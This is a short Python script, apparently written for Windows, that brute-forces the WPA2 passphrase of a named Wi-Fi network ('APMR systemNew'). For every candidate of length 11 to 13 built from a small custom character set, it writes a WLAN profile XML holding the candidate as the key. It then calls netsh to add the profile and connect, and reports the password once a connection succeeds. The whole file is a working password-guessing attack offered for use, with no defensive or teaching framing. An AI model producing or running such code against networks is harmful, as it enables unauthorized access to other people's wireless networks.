import itertools
import string
import subprocess

# SSID of your Wi-Fi
ssid = "APMR systemNew"

chars = 'r','a','j','m','o','h','a','n','@','2','5','R','A','J','M','O','H','A','N','%'



def try_wifi(ssid, password):
    """Try connecting to Wi-Fi with a given password (Windows netsh)."""
    profile = f"""
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
        <name>{ssid}</name>
        <SSIDConfig>
            <SSID>
                <name>{ssid}</name>
            </SSID>
        </SSIDConfig>
        <connectionType>ESS</connectionType>
        <connectionMode>auto</connectionMode>
        <MSM>
            <security>
                <authEncryption>
                    <authentication>WPA2PSK</authentication>
                    <encryption>AES</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>{password}</keyMaterial>
                </sharedKey>
            </security>
        </MSM>
    </WLANProfile>
    """
    
    # Save XML temp file
    with open("wifi_profile.xml", "w") as f:
        f.write(profile)
    
    try:
        # Add profile
        subprocess.run(["netsh", "wlan", "add", "profile", "filename=wifi_profile.xml"], capture_output=True)
        # Try connect
        result = subprocess.run(["netsh", "wlan", "connect", ssid], capture_output=True, text=True)
        
        if "completed successfully" in result.stdout:
            print(f"✅ Password FOUND: {password}")
            return True
    except Exception as e:
        print("Error:", e)
    
    return False





def generate_passwords(min_len=8, max_len=13):
    for length in range(min_len, max_len+1):
        for pwd in itertools.product(chars, repeat=length):
            yield "".join(pwd)

for pwd in generate_passwords(11):
    print(pwd)
    if try_wifi(ssid, pwd):
        break